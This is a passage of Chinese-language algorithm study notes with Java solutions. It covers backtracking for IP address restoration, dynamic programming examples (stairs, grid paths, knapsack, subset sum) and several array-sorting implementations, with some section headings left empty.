1)) &#123;\t\t\tresult.add(s);\t\t&#125;\t\treturn;\t&#125;\t//对于长度超过3的整数剪枝\tfor (int i = startIndex; i &lt; s.length() &amp;&amp; i - startIndex &lt;= 2; i++) &#123;\t\t//对剩余长度超过需要的最大数量的子串的情况剪枝\t\tif ((4 - pointNum - 1) * 3 &lt; s.length() - i) &#123;\t\t\tcontinue;\t\t&#125;\t\tif (!isValid(s, startIndex, i)) &#123;\t\t\tcontinue;\t\t&#125;\t\ts = s.substring(0, i + 1) + &#x27;.&#x27; + s.substring(i + 1);\t\tpointNum++;\t\t//在i+1的基础上，增加了一个逗号，所以是i+2\t\tbacktrace(result, s, pointNum, i + 2);\t\tpointNum--;\t\ts = s.substring(0, i + 1) + s.substring(i + 2);\t&#125;&#125;private boolean isValid(String s, int leftIndex, int rightIndex) &#123;\tif (leftIndex &gt; rightIndex) &#123;\t\treturn false;\t&#125;\t//0开头的非0数字不合法\tif (s.charAt(leftIndex) == &#x27;0&#x27; &amp;&amp; leftIndex != rightIndex) &#123;\t\treturn false;\t&#125;\tfor (int i = leftIndex, sum = 0; i &lt;= rightIndex; i++) &#123;\t\tif (s.charAt(i) &lt; &#x27;0&#x27; || s.charAt(i) &gt; &#x27;9&#x27;) &#123;\t\t\treturn false;\t\t&#125;\t\tsum = sum * 10 + s.charAt(i) - &#x27;0&#x27;;\t\tif (sum &gt; 255) &#123;\t\t\treturn false;\t\t&#125;\t&#125;\treturn true;&#125;\n\nN皇后问题（棋盘问题）解数独（棋盘问题）动态规划法动态规划（Dynamic Programming，简称DP）是解决具有重叠子问题的问题的最有效的解决方法。\n动态规划中的每一个状态一定是由上一个状态推导出来的。这一点就区别于贪心法，贪心法没有状态推导，而是直接选择的局部最优。\n动态规划法的“五部曲”（动态规划法的解题步骤）：\n\n确定dp数组及其下标的含义。\n确定递推公式。题目的难易程度很大程度上与递推公式的难易程度正相关。\n初始化dp数组。递推公式决定了如何初始化dp数组，所以确定递推公式要在初始化dp数组之前。\n确定遍历顺序。如果dp后面元素的取值依赖于dp前面元素的取值，则遍历顺序是从前往后，反之，遍历顺序是从后向往前。\n举例推导dp数组。做动态规划的题目，写代码之前一定要把dp的递推过程先在脑海中模拟一遍，做到心中有数，确定最后推导出的是想要的结果，然后才编写代码。如果代码没通过，就打印结果，查看和自己预先推导的结果是否一样，如果不一样，就是代码的实现有问题。\n\n爬楼梯用法示例（力扣70. 爬楼梯：每次可以爬1或2个台阶，返回爬到第n层楼梯有多少种不同的爬法）：\n按照动态规划法“五部曲”分析如下：\n\n确定dp数组及其下标的含义。\ndp[i]表示到第i层楼梯有几种爬法。\n\n确定递推公式。\n第n层楼梯（dp[i] 种楼梯爬法）可能是从第n-1层楼梯（dp[i - 1]种楼梯爬法）爬一步上来的，也可能是从第n-2层楼梯（dp[i - 2]种楼梯爬法）爬两步上来的。所以递推公式是dp[i] &#x3D; dp[i - 1] + dp[i - 2]。\n\n初始化dp数组。\n因为dp[0]，即第0层的爬法是没有定义的，所以从i&#x3D;1开始初始化，初始化为dp[1]&#x3D;1和dp[2]&#x3D;2，然后从i&#x3D;3开始遍历。\n\n确定遍历顺序。\n从递推公式可以看出，楼层大的楼梯爬法依赖于楼层小的楼梯爬法，所以是从前往后遍历。\n\n举例推导dp数组。\n当n&#x3D;5，dp数组是[没有定义, 1, 2, 3, 5, 8]。\n\n\npublic int climbStairs(int n) &#123;\tif (n &lt;= 2) &#123;\t\treturn n;\t&#125;    //dp[i]表示到第i层楼梯有几种爬法\tint[] dp = new int[n + 1];    //初始化dp数组\tdp[1] = 1;\tdp[2] = 2;    //从前往后遍历，下标范围是[3, n]\tfor (int i = 3; i &lt;= n; i++) &#123;        //递推公式\t\tdp[i] = dp[i - 1] + dp[i - 2];\t&#125;    //返回第n层楼梯的爬法\treturn dp[n];&#125;\n\n使用最低花费爬楼梯用法示例（力扣746. 使用最小花费爬楼梯：给定一个数组，数组内的元素表示从当前位置向上爬一个或者两个台阶需要支付的费用，返回达到楼梯顶部（不是到达最后一个台阶，而是最后一个台阶之上，即对于cost数组，楼梯顶部不是第cost.length-1个楼梯）的最低花费，可以选择下标为0或1的元素作为起始台阶）：\n按照动态规划法“五部曲”分析如下：\n\n确定dp数组及其下标的含义。\ndp[i]是到达第i个台阶的最小花费与在第i个台阶继续往上爬需要的花费的和。\n\n确定递推公式。\ndp[i] &#x3D; cost[i] + min(dp[i - 1] + dp[i - 2])，因为每次可以向上爬一个或两个台阶，所以到达第i个台阶前可能在第i-1个台阶，或第i-2个台阶，最小花费是两者中的最小值。之所以加cost[i]是因为dp[i]包含了从当前台阶再往上爬需要的花费。\n\n初始化dp数组。\n这道题和上一道题不同的是，下标为0的台阶是有定义的，是往上爬所需要的花费。所以这道题中，初始的是dp[0]和dp[1]，使dp[0]&#x3D;cost[0]，dp[1]&#x3D;cost[1]。\n\n确定遍历顺序。\n从递推公式可以看出，楼层大的楼梯的最小花费依赖于楼层小的楼梯的最小花费，所以是从前往后遍历。\n\n举例推导dp数组。\ncost &#x3D; [10,15,20]，dp数组是[10, 15, 35]。\n\n\npublic int minCostClimbingStairs(int[] cost) &#123;\tint length = cost.length;\tint[] dp = new int[length];\tdp[0] = cost[0];\tdp[1] = cost[1];\tfor (int i = 2; i &lt; length; i++) &#123;\t\tdp[i] = Math.min(dp[i - 1], dp[i - 2]) + cost[i];\t&#125;\t//不是dp[length - 1] - cost[length - 1]\treturn Math.min(dp[length - 1], dp[length - 2]);&#125;\n\n不同路径用法示例（力扣62. 不同路径：返回机器人从二维网格（n行m列）的左上角移动到右下角有的不同移动路径的数量，机器人每次只能向下或者向右移动一步）：\n深度优先搜索法机器人每次只能向下或向右移动一步，那么机器人走过的路径就可以抽象为一颗二叉树，叶子节点就是终点。\npublic int uniquePaths(int m, int n) &#123;\treturn dfs(1, 1, m, n);&#125;public int dfs(int i, int j, final int m, final int n) &#123;\t//越界了\tif (i &gt; m || j &gt; n) &#123;\t\treturn 0;\t&#125;\t//搜索到终点，找到了一条路径\tif (i == m &amp;&amp; j == n) &#123;\t\treturn 1;\t&#125;\t//从向下和向右两个方向寻找路径\treturn dfs(i + 1, j, m, n) + dfs(i, j + 1, m, n);&#125;\n\n但是二叉树的深度优先搜索的时间复杂度是2的n次方级别，非常耗时。1， \n动态规划法动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\ndp[i][j - 1]表示从(0, 0)出发到达(i, j)位置的路径数。\n\n确定递推公式。\n因为机器人只能向下或向右走，所以对于(i , j)位置，只可能是从上或者从左走来机器人，dp[i][j] &#x3D; dp[i - 1][ j] + dp[i][j - 1]。\n\n初始化dp数组。\n因为从(0, 0)到(i, 0)的路径只有一条，所以dp[i][0]一定都是1，dp[0][j]同理。\n\n确定遍历顺序。\n从递推公式可以看出，dp[i][j]依赖于其上方和左方，所以遍历顺序是从上往下，从左往右。\n\n举例推导dp数组。\n假设n&#x3D;3, m&#x3D;4，dp&#x3D;[[1, 1, 1, 1], [1, 2, 3, 4], [1, 3, 6, 10]]。\n\n\npublic int uniquePaths(int m, int n) &#123;\tint[][] dp = new int[m][n];\tfor (int i = 0; i &lt; m; i++) &#123;\t\tdp[i][0] = 1;\t&#125;\tfor (int j = 0; j &lt; n; j++) &#123;\t\tdp[0][j] = 1;\t&#125;\tfor (int i = 1; i &lt; m; i++) &#123;\t\tfor (int j = 1; j &lt; n; j++) &#123;\t\t\tdp[i][j] = dp[i - 1][j] + dp[i][j - 1];\t\t&#125;\t&#125;\treturn dp[m - 1][n - 1];&#125;\n\n有障碍情况下的不同路径用法示例（力扣63. 不同路径 II：在上一题的基础上加了一个限制条件，即有的网格中有障碍物）：\n动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\ndp[i][j]表示从起点(0, 0)出发到达(i, j)位置有dp[i][j]条不同的路径。\n\n确定递推公式。\n如果obstacleGrid[i, j] !&#x3D; 1，则dp[i][j] &#x3D; dp[i - 1][ j] + dp[i][j - 1]，否则dp[i][j]&#x3D;0。\n所以本题的递归代码如下：\nif (obstacleGrid[i][j] != 1) &#123;    dp[i][j] = dp[i - 1][j] + dp[i][j - 1];&#125;\n\n初始化dp数组。\n在初始化从(0, 0)到(m, 0)上的值时，如果obstacleGrid[i][0]是1，存在障碍物，则从(i, 0)到(m, 0)的值都是0，因为不能到达(i, 0)到(m, 0)范围内的网格。同理，如果(0, j)的值是0，则从(0, j)到(0, n)，也都是不能到达的，值也是0。\n所以本题的初始化代码如下：\nfor (int i = 0; i &lt; m &amp;&amp; obstacleGrid[i][0] != 1; i++) &#123;\tdp[i][0] = 1;&#125;for (int j = 0; j &lt; n &amp;&amp; obstacleGrid[0][j] != 1; j++) &#123;\tdp[0][j] = 1;&#125;\n\n确定遍历顺序。\n从递推公式可以看出，dp[i][j]依赖于其上方和左方，所以遍历顺序是从上往下，从左往右。\n\n举例推导dp数组。\n以输入obstacleGrid &#x3D; [[0,0,0],[0,1,0],[0,0,0]]为例，dp的值为[[1,1,1],[1,0,1],[1,1,2]]。\n\n\npublic int uniquePathsWithObstacles(int[][] obstacleGrid) &#123;    int m = obstacleGrid.length;    int n = obstacleGrid[0].length;    int[][] dp = new int[m][n];    for (int i = 0; i &lt; m &amp;&amp; obstacleGrid[i][0] != 1; i++) &#123;        dp[i][0] = 1;    &#125;    for (int j = 0; j &lt; n &amp;&amp; obstacleGrid[0][j] != 1; j++) &#123;        dp[0][j] = 1;    &#125;    for (int i = 1; i &lt; m; i++) &#123;        for (int j = 1; j &lt; n; j++) &#123;            if (obstacleGrid[i][j] != 1) &#123;                dp[i][j] = dp[i - 1][j] + dp[i][j - 1];            &#125;        &#125;    &#125;    return dp[m - 1][n - 1];&#125;\n\n整数拆分后的最大乘积用法示例（力扣343. 整数拆分：将一个正整数拆分为至少两个正整数的和，并使这些拆分出的正整数乘积最大化（确保拆分出来的正整数的成绩是所有拆分方式下的正整数乘积中最大的），返回可以获得的最大乘积）：\n动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\ndp[i]是拆分数字i可以得到的最大乘积。\n\n确定递推公式。使用下标j遍历从1到i-1范围内的dp数组，dp[i]&#x3D;max(dp[i], (i - j) * j, dp[i - j] * j)，其中dp[i]表示已经遍历得到的最大乘积，(i - j) * j表示单纯地把整数拆分成两个数相乘，dp[i - j] * j表示将整数拆分成两个数或两个以上的数的乘积。\n\n初始化dp数组。\n因为0和1不能拆分成两个正整数，所以dp[0]和dp[1]是没有意义的。所以只初始化dp[2]，而因为2只能拆分成两个1，最大乘积为1，所以dp[2]&#x3D;1。\n\n确定遍历顺序。\n从递推公式可以看出，dp[i]依赖于其左侧元素的取值，所以遍历是从前向后遍历。\n\n举例推导dp数组。\n以整数10为例，dp数组为[0, 0, 1, 2, 4, 6, 9, 12, 18, 27, 36]。\n\n\npublic int integerBreak(int n) &#123;\tint[] dp = new int[n + 1];\tdp[2] = 1;\tfor (int i = 3; i &lt;= n; i++) &#123;\t\t//遍历拆分方式\t\tfor (int j = 1; j &lt; i - 1; j++) &#123;\t\t\t//i = (i - j) + j\t\t\t////不对i-j进行拆分\t\t\tdp[i] = Math.max(dp[i], (i - j) * j);\t\t\t//对i-j进行拆分\t\t\tdp[i] = Math.max(dp[i], dp[i - j] * j);\t\t&#125;\t&#125;\treturn dp[n];&#125;\n\n不同的二叉搜索树种树用法示例（力扣96. 不同的二叉搜索树：返回n个节点能够组成的所有不同的二叉搜索树的种数）：\n动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\ndp[i]表示i个节点能够组成的所有不同的二叉搜索树的种数。\n\n确定递推公式。\ndp[i] +&#x3D; dp[j - 1] * dp[i - j]，j相当于头节点的元素，遍历范围是[1, i]，dp[j-1]是以j为头节点的左子树的数量，dp[i - j]是以j为头结点的右子树的数量。\n\n初始化dp数组。\n只需要初始化dp[0]即可，因为其余dp[i]推导的基础都是dp[0]。那么dp[0]应该初始为多少？从dp[i]数组的含义看，dp[0]表示节点数为0的二叉树，即dp[0]&#x3D;1，从递推公式上看，假如i&#x3D;1，则dp[1]&#x3D;1&#x3D;dp[1-1]*dp[1-1]&#x3D;dp[0]*d[0]，即dp[0]等于1，所以初始化dp[0]&#x3D;1。\n\n确定遍历顺序。\n从递推公式可以看出，节点数为i的dp值，依赖于小于i的节点数的dp值，所以遍历顺序是从左往右。\n\n举例推导dp数组。\n以n为4为例，dp数组为[1, 1, 2, 5, 14]。\n\n\npublic int numTrees(int n) &#123;\tint[] dp = new int[n + 1];\tdp[0] = 1;\tfor (int i = 1; i &lt;= n; i++) &#123;\t\tfor (int j = 1; j &lt;= i; j++) &#123;\t\t\tdp[i] += dp[j - 1] * dp[i - j];\t\t&#125;\t&#125;\treturn dp[n];&#125;\n\n\n\n背包能够装入物品的最大价值（0-1背包问题）0-1背包问题的特点是每种物品只有一个。0-1背包问题可以使用回溯法进行暴力求解，时间复杂度是2的n次方，是指数级别的，使用动态规划能够降低0-1背包问题的时间复杂度。\n用法示例（AcWing01背包问题：返回给定容量的背包能够装入物品的最大价值）：\n二维dp数组解法动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\n如果使用二维dp数组解决0-1背包问题，则dp[i][j]表示从[0, i]件物品中选取物品，在这些物品能被容量为j的背包容纳的前提下，实现物品价值总和最大。\n\n确定递推公式。\n对于第i个物品，只存在两种选取方式，选或者不选，并且第i个物品的dp数组的值建立在第i-1个物品的选取结果之上。所以dp[i][j] &#x3D; max(选，不选) &#x3D; max(dp[i - 1][j - weight[i]] + value[i], dp[i -1][j])，其中dp[i - 1][j - weight[i]] + value[i]代表选取了第i个物品，需要将背包容量j减去weight[i]，dp[i -1][j]代表不选取，容量不改变，价值也不改变，当然存在dp[i - 1][j - weight[i]] + value[i]的前提是j大于等于weight[i]。\n\n初始化dp数组。\n由递推公式可以看出，dp[i][j]的计算依赖于dp[i - 1][j - weight]和dp[i -1][j]，即位置(i, j)的左上方(i - 1, j - weight[i])和上方(i - 1, j)。所以需要初始化dp数组的最左侧[0, 最大物品下标]和最上侧[0, 最大背包大小]的元素。因为在dp数组的最左侧位置下最大背包的大小为0，所以dp数组的最左侧元素值为0，\n\n确定遍历顺序。\n从递推公式可以看出，dp数组的计算依赖于其左侧和上方，所以遍历顺序是从左到右，从上到下。至于是先从左到右，再从上到下（先遍历物品再遍历背包容量），还是先从上到下，再从左到右（先遍历背包容量，再遍历物品），这道题中两种遍历顺序都可以，因为都能够保证递推公式中被依赖的部分先被计算。\n\n举例推导dp数组。\n以背包容量为4，物品的重量和价值的二维数组为[[1, 15], [3, 20], [4, 30]]为例，dp数组为[[0, 15, 15, 15, 15], [0, 15, 15, 20, 35], [0, 15, 15, 20, 35]]。\n\n\npublic static void main(String[] args) &#123;    Scanner scanner = new Scanner(System.in);    int N = scanner.nextInt();    int V = scanner.nextInt();    scanner.nextLine();    int[] weight = new int[N];    int[] value = new int[N];    for (int i = 0; i &lt; N; i++) &#123;        weight[i] = scanner.nextInt();        value[i] = scanner.nextInt();        scanner.nextLine();    &#125;    int[][] dp = new int[N][V + 1];    //初始化第0行，如果下标为0的物品的重量小于背包的容量，则dp[0][j]的元素值就是下标为0的物品的价值    for (int j = weight[0]; j &lt;= V; j++) &#123;        dp[0][j] = value[0];    &#125;    for (int i = 1; i &lt; N; i++) &#123;        for (int j = 1; j &lt;= V; j++) &#123;            if (j &gt;= weight[i]) &#123;                dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - weight[i]] + value[i]);            &#125; else &#123;                dp[i][j] = dp[i - 1][j];            &#125;        &#125;    &#125;    System.out.println(dp[N - 1][V]);&#125;\n\n一维dp数组（滚动数组）解法一维dp数组也就是滚动数组，在dp[i]层直接复用dp[i - 1]层。\n动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\ndp[j]表示容量为j的背包能够装下的物品的最大价值。\n\n确定递推公式。\ndp[j] &#x3D; max(dp[j], dp[j - weight[i]] + value[i])，其中dp[j - weight[i]]表示容量为j-weight[i]的背包所装的物品的最大价值。可以看出相对于二维dp数组的写法，这里去掉了dp[i][j]中的i的维度。\n\n初始化dp数组。\n将0下标的元素初始化为0：因为dp[j]表示容量为j的背包所背物品的最大价值，所以dp[j] &#x3D; 0。\n将非0下标的元素初始化为0（不大于物品的每个价值）：如果和二维dp数组解法中一样初始化为value[0]，则如果value[0]是非常大的数值，那么dp[i]始终会被更新为value[0]，而其他物品的价值可能无法正确地被纳入计算，这会导致错误的最优解。\n\n确定遍历顺序。\n只能先遍历物品，再遍历背包：如果是先遍历背包，那么每遍历一个背包容量值，dp数组中最后一个元素是针对于最后一个物品的dp值，在转入到下一个背包容量值时，对应是不是二维dp数组中i-1层的数据，而是最后一个物品所在层的数据，这不符合一维dp数组的作用（在dp[i]层直接复用dp[i - 1]层），即不再是复用第dp[i-1]层，而是复用第dp[n - 1]层（n-1是最后一个物品的下标）。\n背包容量需要从后往前遍历：虽然一维dp数组的递推公式和二维的十分类似，但是因为一维的dp数组的数值需要在下一次遍历背包容量时被使用，并且会被覆盖，所以需要先计算并覆盖最靠后的dp数组元素，这些靠后的元素不会被前面的元素使用，而前面的元素会被后面的元素使用，所以遍历背包的时候，需要从后往前遍历。\n\n举例推导dp数组。\n以背包容量为4，物品的重量和价值的二维数组为[[1, 15], [3, 20], [4, 30]]为例，dp数组的变化过程为\n用物品0遍历背包：[0, 15, 15, 15, 15]\n用物品1遍历背包：[0, 15, 15, 20, 35]\n用物品2遍历背包：[0, 15, 15, 20, 35]\n\n\npublic static void main(String[] args) &#123;    Scanner scanner = new Scanner(System.in);    int N = scanner.nextInt();    int V = scanner.nextInt();    int[] weight = new int[N];    int[] value = new int[N];    for (int i = 0; i &lt; N; i++) &#123;        scanner.nextLine();        weight[i] = scanner.nextInt();        value[i] = scanner.nextInt();    &#125;    int[] dp = new int[V + 1];    //遍历物品，从第0个物品开始    for (int i = 0; i &lt; N; i++) &#123;        //遍历背包大小，从后往前遍历        for (int j = V; j &gt;= weight[i]; j--) &#123;            dp[j] = Math.max(dp[j], dp[j - weight[i]] + value[i]);        &#125;    &#125;    System.out.println(dp[V]);&#125;\n\n分割等和子集（0-1背包问题）用法示例（力扣416. 分割等和子集：判断给定的数组能否分割为两个和相等的子集，数组的长度范围是[1, 200]，数组中元素的取值范围是[1, 100]）：\n本题可以使用回溯法中的子集问题的解决办法，但是很费时，下面看如何将这道题转换为背包问题。因为在这个题中，每个数组元素只能使用一次，相当于背包问题中的物品只能放入背包一次，所以是0-1背包问题。\n要将这个问题转换为0-1背包问题，需要确定背包的容量，这道题中因为是要找sum&#x2F;2大小的子集，所以背包的容量是sum&#x2F;2，放入背包的物品的重量和价值相等，如果背包能够正好装满，说明找到了总和为sum&#x2F;2的子集。\n动态规划法“五部曲”：\n\n确定dp数组及其下标的含义。\n这里使用的是一维dp数组，dp[i]表示容量为i的背包能够容纳的物品的价值最大值。如果dp[i] &#x3D;&#x3D; i，则说明集合中的子集总和正好可以凑成总和i。\ndp数组的长度是所有元素的最大总和，数组的最大长度乘以数组元素的最大值是20000，且背包容量是sum&#x2F;2，所以背包的最大容量是10000，所以dp数组的最大长度是10001。\n\n确定递推公式。\n0-1背包的一维dp数组的递推公式是dp[j] &#x3D; max(dp[j], dp[j - weight[i] + value[i]])，因为这道题中物品的重量和价值都是给定的数组元素值，所以这道题的递推公式是dp[j] &#x3D; max(dp[j], dp[j - nums[i]] + nums[i])。\n\n初始化dp数组。\n题目中给定的数组元素值都是大于0的数，所以非零下标初始化为0即可。\n\n确定遍历顺序。\n先遍历物品，再遍历背包，且遍历背包时，需要从后往前遍历。\n\n举例推导dp数组。\n以给定数组为[1,5,11,5]为例，dp数组长度为(1+5+11+5)&#x2F;2&#x3D;11，dp数组为\n用物品0遍历背包：[0,1,1,1,1,1,1,1,1,1,1,1]\n用物品1遍历背包：[0,1,1,1,1,5,6,6,6,6,6,6]\n用物品2遍历背包：[0,1,1,1,1,5,6,6,6,6,6,6]\n用物品3遍历背包：[0,1,1,1,1,5,6,6,6,6,10,11]\n\n\n目标和（0-1背包问题）一和零（0-1背包问题）零钱兑换（完全背包问题）完全背包问题的特点是每种物品有无限个。完全背包问题和0-1背包问题在题目描述上唯一不同的地方就是每种物品的数量是一个还是无限个。\n爬楼梯（完全背包问题）完全平方数（完全背包问题）单词拆分（完全背包问题）打家劫舍买卖股票的最佳时机（可以买卖多次）买卖股票的最佳时机（最多买卖k次）买卖股票的最佳时机（卖出后有冷冻期）买卖股票的最佳时机（有手续费）最长递增子序列（子序列问题）最长连续递增子序列（子序列问题）不相交的线（子序列问题）最长重复子数组（子序列问题）最大子序和（子序列问题）图深度优先搜索宽度优先搜索最短路径计算连通分量拓扑排序计算强连通分量Dijkstra最短路径算法Prim最小生成树算法并查集排序class Solution &#123;    // 二刷-快速排序    public int[] sortArray(int[] nums) &#123;        quickSort(nums, 0, nums.length - 1);        return nums;    &#125;    public void quickSort(int[] nums, int begin, int end) &#123;        if (begin &gt;= end) &#123;            return;        &#125;        int partition = partition(nums, begin, end);        quickSort(nums, begin, partition - 1);        quickSort(nums, partition + 1, end);    &#125;    public int partition(int[] nums, int begin, int end) &#123;        int partition = new Random().nextInt(end - begin + 1) + begin;        swap(nums, partition, end); // 所以比pivot（即nums[partition]）小的元素一定在pivot左边        int index = begin;        for (int i = begin, pivot = nums[end]; i &lt; end; i++) &#123;            if (nums[i] &lt; pivot) &#123;                swap(nums, i, index++);            &#125;        &#125;        swap(nums, index, end);        return index;    &#125;    public void swap(int[] nums, int i, int j) &#123;        int temp = nums[i];        nums[i] = nums[j];        nums[j] = temp;    &#125;&#125;\n\nclass Solution &#123;    // 二刷--归并排序    public int[] sortArray(int[] nums) &#123;        mergeSort(nums, new int[nums.length], 0, nums.length - 1);        return nums;    &#125;    public void mergeSort(int[] nums, int[] sortArray, int begin, int end) &#123;        if (begin == end) &#123;            return;        &#125;        int mid = begin + ((end - begin) &gt;&gt; 1);        mergeSort(nums, sortArray, begin, mid);        mergeSort(nums, sortArray, mid + 1, end);        merge(nums, sortArray, begin, mid, end);    &#125;    public void merge(int[] nums, int[] sortArray, int begin, int mid, int end) &#123;        int i = begin;        int j = mid + 1;        int index = begin;        while (i &lt;= mid &amp;&amp; j &lt;= end) &#123;            sortArray[index++] = nums[i] &lt;= nums[j] ? nums[i++] : nums[j++];        &#125;        while (i &lt;= mid) &#123;            sortArray[index++] = nums[i++];        &#125;        while (j &lt;= end) &#123;            sortArray[index++] = nums[j++];        &#125;        System.arraycopy(sortArray, begin, nums, begin, end - begin + 1);    &#125;&#125;\n\nimport java.util.Arrays;import java.util.Random;class Solution &#123;    //计数排序    public int[] sortArray(int[] nums) &#123;        countingSort(nums);        return nums;    &#125;    public void countingSort(int[] nums) &#123;        final int MIN_RANGE = 50000;        final int LEN = 100001;        int[] countingArray = new int[LEN];        for (int num : nums) &#123;            countingArray[num + MIN_RANGE]++;        &#125;        for (int i = 0, index = 0; i &lt; LEN; i++) &#123;            int count = countingArray[i];            while (count-- &gt; 0)&#123;                nums[index++] = i - MIN_RANGE;            &#125;        &#125;    &#125;&#125;\n\n\n\nReferences\n孙秀洋. 代码随想录：跟着Carl学算法. 北京：电子工业出版社, 2021.12.\nhttps://programmercarl.com/\nhttps://www.acwing.com/problem/\n\n","categories":["IT"],"tags":["数据结构和算法"]}]